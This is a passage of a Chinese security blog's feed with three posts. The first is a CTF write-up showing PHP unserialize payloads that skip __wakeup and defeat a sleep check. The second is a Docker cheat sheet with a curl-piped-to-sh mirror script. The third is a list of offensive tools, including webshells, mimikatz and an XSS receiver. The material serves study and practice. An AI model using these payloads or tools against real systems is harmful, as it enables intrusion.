class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;password)) &#123;</span><br><span class="line"><span class="keyword">if</span>(strcmp(<span class="keyword">$this</span>-&gt;password,<span class="keyword">$this</span>-&gt;truepassword)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;time))&#123;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="keyword">$this</span>-&gt;time))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Sorry.&lt;br&gt;'</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;time &lt; <span class="number">11</span> * <span class="number">22</span> * <span class="number">33</span> * <span class="number">44</span> * <span class="number">55</span> * <span class="number">66</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'you need a bigger time.&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;time &gt; <span class="number">66</span> * <span class="number">55</span> * <span class="number">44</span> * <span class="number">33</span> * <span class="number">23</span> * <span class="number">11</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'you need a smaller time.&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">sleep((int)<span class="keyword">$this</span>-&gt;time);</span><br><span class="line">var_dump(<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello hacker,I have changed your password and time, rua!'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'rua'</span>]))&#123;</span><br><span class="line">    <span class="comment">//$test = new Time(1.275523920, array("a"));</span></span><br><span class="line">$rua = $_GET[<span class="string">'rua'</span>];</span><br><span class="line">@unserialize($rua);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Please don't stop rua 233333&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>稍稍记录一下，简单的反序列化。</p><p><strong>何为序列化？</strong></p><blockquote><p>序列化对象 - 在会话中存放对象 ¶<br>所有 php 里面的值都可以使用函数 serialize() 来返回一个包含字节流的字符串来表示。unserialize() 函数能够重新把字符串变回 php 原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。<br>为了能够unserialize()一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数spl_autoload_register()来实现。</p></blockquote><p>序列化字符串格式：<strong>变量类型：变量长度：变量内容</strong><br>例如序列化对象字符串：</p><blockquote><p>变量类型：类名长度：类名：属性数量：{属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容}</p></blockquote><p><strong>PHP 中的魔术方法（Magic methods）</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， </span><br><span class="line">__sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone()，__debugInfo()</span><br></pre></td></tr></table></figure></p><p>这里我们着重关注几个：</p><ul><li><code>__construct()</code>：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li><li><code>__destruct()</code>：当对象被销毁时会自动调用。</li><li><code>__sleep()</code>：serialize() 会检查类中是否存在一个魔术方法 __sleep()。若存在，该方法会先被调用，再执行序列化操作</li><li><code>__wakeup()</code>：unserialize() 会检查是否存在一个 <strong>wakeup() 方法。若存在，则先调用 </strong>wakeup 方法，预先准备对象需要的资源。</li><li><code>__toString()</code>：用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。</li></ul><p>PHP 有个 Bug，该漏洞可以概括为：</p><blockquote><p>当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过 __wakeup 函数的执行<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rua</span>=O:<span class="number">4</span>:<span class="string">"Time"</span>:<span class="number">3</span>:&#123;</span><br></pre></td></tr></table></figure></p></blockquote><p>注意上面的 3 ，是属性数量，本来2个就够了。</p><p>16进制 <code>0x</code> 开头在强制转换中出现问题，导致转换成0</p><p>payload 如下：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rua</span>=O:4:<span class="number">%22</span>Time<span class="number">%22</span>:4:&#123;s:4:<span class="number">%22</span>time<span class="number">%22</span>;s:10:<span class="number">%220</span>x4c06f350<span class="number">%22</span>;s:8:<span class="number">%22</span>password<span class="number">%22</span>;a:2:&#123;i:0;s:1:<span class="number">%22</span>a<span class="number">%22</span>;i:1;s:1:<span class="number">%22</span>b<span class="number">%22</span>;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>还有一种办法：科学计数法绕过 sleep()<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rua=<span class="string">O:</span><span class="number">4</span>:<span class="string">"Time"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"time"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"1.3e9"</span>;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://123.206.31.85:10012/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原题网址&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Docker-常用命令清单</title>
    <link href="https://wywwzjj.top/2018/11/30/Docker_%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://wywwzjj.top/2018/11/30/Docker_常用命令/</id>
    <published>2018-11-30T04:43:26.000Z</published>
    <updated>2019-03-20T05:18:47.814Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>一个 <strong>Docker Registry</strong> 中可以包含多个 <strong>仓库（Repository）</strong></p><p>每个仓库可以包含多个<strong>标签（Tag）</strong>，每个标签对应一个镜像</p><p><code>镜像</code>和<code>容器</code>的关系，就像<code>类</code>与<code>对象</code></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 更新相关软件</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install apt-transport-https ca-certificates curl software-properties-common</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加Docker源</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">apt-cache policy docker-ce</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下面是安装信息：</span></span><br><span class="line">docker-ce:</span><br><span class="line">  Installed: (none)</span><br><span class="line">  Candidate: 18.06.1~ce~3-0~ubuntu</span><br><span class="line">  Version table:</span><br><span class="line">     18.06.1~ce~3-0~ubuntu 500</span><br><span class="line">        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages</span><br><span class="line">     18.06.0~ce~3-0~ubuntu 500</span><br><span class="line">        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages</span><br><span class="line">     18.03.1~ce~3-0~ubuntu 500</span><br><span class="line">        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages</span><br><span class="line">        </span><br><span class="line"><span class="meta">#</span><span class="bash"> 正式安装</span></span><br><span class="line">sudo apt install docker-ce</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看运行状态</span></span><br><span class="line">sudo systemctl status docker</span><br></pre></td></tr></table></figure><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p><strong>Docker也遵守Linux命令的格式</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker [option] [command] [arguments]</span><br><span class="line"></span><br><span class="line">docker search ubuntu  # 查找镜像</span><br><span class="line">docker pull name# 下载image</span><br><span class="line">docker push # 推送镜像</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -t IMAGE /bin/bash  # 启动交互式容器</span><br><span class="line">docker inspect NAME  # 查看详细信息？</span><br><span class="line">docker run --name=xxx -it IMAGE /bin/bash  # 以xxx为名字运行</span><br><span class="line"><span class="meta">#</span><span class="bash"> CTRL + p + q   =&gt;  退出并后台运行</span></span><br><span class="line">docker attach 容器名  # 恢复到后台容器，更建议使用 docker exec？</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看守护进程</span></span><br><span class="line">ps -ef | grep docker</span><br><span class="line">sudo status docker</span><br><span class="line"></span><br><span class="line">docker top </span><br><span class="line">docker exec [-d][-i][-t] nginx  # 为运行中的容器启动新进程</span><br><span class="line">docker logs </span><br><span class="line">docker images#列出本地镜像</span><br><span class="line">docker start CONTAINER #启动一个或多少已经被停止的容器</span><br><span class="line">docker stop / kill CONTAINER #停止一个运行中的容器</span><br><span class="line">docker restart CONTAINER #重启容器</span><br><span class="line">docker rm CONTAINER #删除容器  -f 强制删除</span><br><span class="line">docker rmi IMAGE #删除镜像</span><br><span class="line">docker rmi $(docker images -q ubuntu)  # 删除Ubuntu所有镜像</span><br><span class="line">sudo systemctl daemon-reload #reload daemon.json</span><br><span class="line">sudo systemctl restart docker #重启docker</span><br><span class="line"></span><br><span class="line">docker info  # 查看信息</span><br><span class="line">docker diff 容器名 # 查看改动信息</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 端口映射</span></span><br><span class="line">docker run -p 80 -it # -i 标准输入保持打开</span><br><span class="line">docker run -p 8080:80 -it # -t 为docker分配一个伪终端(pseudo-tty)，并绑定到容器的标准输入</span><br><span class="line">docker run -p 0.0.0.0:80 -it </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看端口映射情况</span></span><br><span class="line">docker port docker_name</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 容器快照？</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 导出容器</span></span><br><span class="line">docker export ID &gt; ubuntu.zip</span><br><span class="line"><span class="meta">#</span><span class="bash"> 导入容器</span></span><br><span class="line">cat ubuntu.zip | docker import - test/ubuntu:v1.0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过URL导入</span></span><br><span class="line">docker import http://xxx example/imagesrepo</span><br><span class="line"><span class="meta">#</span><span class="bash"> 数据卷</span></span><br><span class="line">docker volume create xxx</span><br><span class="line">docker run -it -v ~/datavolume:/data:ro ubuntu /bin/bash  # ro设置只读权限</span><br><span class="line"><span class="meta">#</span><span class="bash"> 数据卷容器</span></span><br><span class="line">docker run -it --name dv --volumes-from dvt4 ubuntu /bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制文件到容器中</span></span><br><span class="line">docker cp xxx id:/dir</span><br><span class="line">docker cp ./test apache:/var/www/</span><br><span class="line">docker exec -it apache</span><br></pre></td></tr></table></figure><h2 id="部署实例"><a href="#部署实例" class="headerlink" title="部署实例"></a>部署实例</h2><p><strong>Nginx 部署流程</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建映射80端口的交互式容器</span></span><br><span class="line">docker run -p 8080:80 --name web -it ubuntu /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装Nginx</span></span><br><span class="line">apt update</span><br><span class="line">apt install - y nginx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装文本编辑器 vim</span></span><br><span class="line">apt install -y vim</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建静态页面</span></span><br><span class="line">cd /var/www/html</span><br><span class="line">touch index.html</span><br><span class="line">echo '&lt;h1&gt;Hello, Docker!&lt;/h1&gt;' &gt; index.html</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改Nginx配置文件</span></span><br><span class="line">whereis nginx  # 找到安装目录</span><br><span class="line">vim /etc/nginx/sites-enabled/default  # 修改 root 目录</span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行Nginx</span></span><br><span class="line">nginx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证网站访问</span></span><br><span class="line">curl IP:port  # ip 可用宿主机的IP加映射端口，也可以用 docker inspect web 查看真实容器IP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 停止容器</span></span><br><span class="line">docker stop web</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">docker start -i web  # 此时会发现，nginx已经停止</span><br><span class="line">docker exec web nginx </span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果之前没有指定端口时，重新启动时 port 将发生变化</span></span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/2ad3edf3c61f" target="_blank" rel="noopener">sqli-labs Docker</a></p><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 通过容器构建</span></span><br><span class="line">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</span><br><span class="line">docker commit \</span><br><span class="line">    --author "Tao Wang &lt;twang2218@gmail.com&gt;" \</span><br><span class="line">    --message "修改了默认网页" \</span><br><span class="line">    webserver \</span><br><span class="line">    nginx:v2</span><br><span class="line"><span class="meta">#</span><span class="bash"> ！慎用 docker commit</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用dockerfile构建镜像  —— 包括一系列命令的文件，类似shell脚本？</span></span><br><span class="line">dockerfile编写语法</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注释</span></span><br><span class="line"></span><br><span class="line">docker build   # 构建镜像</span><br></pre></td></tr></table></figure><h2 id="优化体验"><a href="#优化体验" class="headerlink" title="优化体验"></a>优化体验</h2><p><strong>配置 Docker 加速器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br><span class="line">sudo systemctl restart docker.service  # 重启 Docker 生效</span><br><span class="line"></span><br><span class="line">docker info</span><br><span class="line"><span class="meta">#</span><span class="bash"> 包含以下信息，加速器配置成功</span></span><br><span class="line">Registry Mirrors:</span><br><span class="line"> http://f1361db2.m.daocloud.io/</span><br></pre></td></tr></table></figure><p><strong>Docker不使用sudo</strong></p><p>将用户添加到 docker 用户组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker $USER  # 先试这个</span><br><span class="line"></span><br><span class="line">cat /etc/group | grep docker # 查找 docker 组，确认其是否存在</span><br><span class="line">groups # 列出自己的用户组，确认自己在不在 docker 组中</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果 docker 组不存在，则添加之：</span></span><br><span class="line">sudo groupadd docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将当前用户添加到 docker 组</span></span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启服务</span></span><br><span class="line">sudo service docker restart</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 切换一下用户组（刷新缓存）</span></span><br><span class="line">newgrp - docker;</span><br><span class="line">newgrp - `groups $&#123;USER&#125; | cut -d' ' -f1`; # TODO：必须逐行执行，不知道为什么，批量执行时第二条不会生效</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者，注销并重新登录</span></span><br><span class="line">pkill X</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;p&gt;一个 &lt;strong&gt;Docker Registry&lt;/strong&gt; 中可以包含多个 &lt;strong&gt;仓库（Reposit
      
    
    </summary>
    
    
      <category term="Docker" scheme="https://wywwzjj.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>漏洞练习平台及工具</title>
    <link href="https://wywwzjj.top/2018/11/23/%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0%E5%8F%8A%E5%B7%A5%E5%85%B7/"/>
    <id>https://wywwzjj.top/2018/11/23/漏洞练习平台及工具/</id>
    <published>2018-11-23T02:38:38.000Z</published>
    <updated>2019-03-11T02:47:35.823Z</updated>
    
    <content type="html"><![CDATA[<p>持续更新，欢迎评论</p><h2 id="练习平台"><a href="#练习平台" class="headerlink" title="练习平台"></a>练习平台</h2><p>WebGoat漏洞练习环境</p><p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p><p><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat-Legacy</a></p><p>Damn Vulnerable Web Application</p><p><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="noopener">https://github.com/RandomStorm/DVWA</a></p><p>数据库注入练习平台</p><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><p>用node编写的漏洞练习平台，like OWASP Node Goat</p><p><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="noopener">https://github.com/cr0hn/vulnerable-node</a></p><h2 id="花式扫描器"><a href="#花式扫描器" class="headerlink" title="花式扫描器"></a>花式扫描器</h2><p>端口扫描器Nmap</p><p><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></p><p>本地网络扫描器</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>子域名扫描器</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p>漏洞路由扫描器</p><p><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="noopener">https://github.com/jh00nbr/Routerhunter-2.0</a></p><p>迷你批量信息泄漏扫描脚本</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>Waf类型检测工具</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><h2 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h2><p>社工插件，可查找以email、phone、username的注册的所有网站账号信息</p><p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p><p>Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息</p><p><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p><p>github Repo信息搜集工具</p><p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>webshell大合集</p><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><p>渗透以及web攻击脚本</p><p><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集</p><p><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hack_tools_for_me</a></p><p>XSS数据接收平台</p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><p>XSS与CSRF工具</p><p><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p><p>Short for command injection exploiter，web向命令注入检测工具</p><p><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>数据库注入工具</p><p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p><p>Web代理，通过加载sqlmap api进行sqli实时检测</p><p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p><p>新版中国菜刀</p><p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p><p>.git泄露利用EXP</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>浏览器攻击框架</p><p><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p><p>自动化绕过WAF脚本</p><p><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a></p><p>http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）</p><p><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p><p>浏览器调试利器</p><p><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a></p><p>一款开源WAF</p><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><h2 id="windows域渗透工具"><a href="#windows域渗透工具" class="headerlink" title="windows域渗透工具"></a>windows域渗透工具</h2><p>windows渗透神器</p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p><p>Powershell渗透库合集</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Powershell tools合集</p><p><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell</a></p><h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><p>Web向Fuzz工具</p><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>HTTP暴力破解，撞库攻击脚本</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><h2 id="漏洞利用及攻击框架"><a href="#漏洞利用及攻击框架" class="headerlink" title="漏洞利用及攻击框架"></a>漏洞利用及攻击框架</h2><p>msf</p><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等</p><p><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a></p><p>Pocsuite</p><p><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="noopener">https://github.com/knownsec/Pocsuite</a></p><p>Beebeeto</p><p><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="noopener">https://github.com/n0tr00t/Beebeeto-framework</a></p><h2 id="漏洞POC-amp-EXP"><a href="#漏洞POC-amp-EXP" class="headerlink" title="漏洞POC&amp;EXP"></a>漏洞POC&amp;EXP</h2><p>ExploitDB官方git版本</p><p><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析</p><p><a href="https://github.com/80vul/phpcodz" target="_blank" 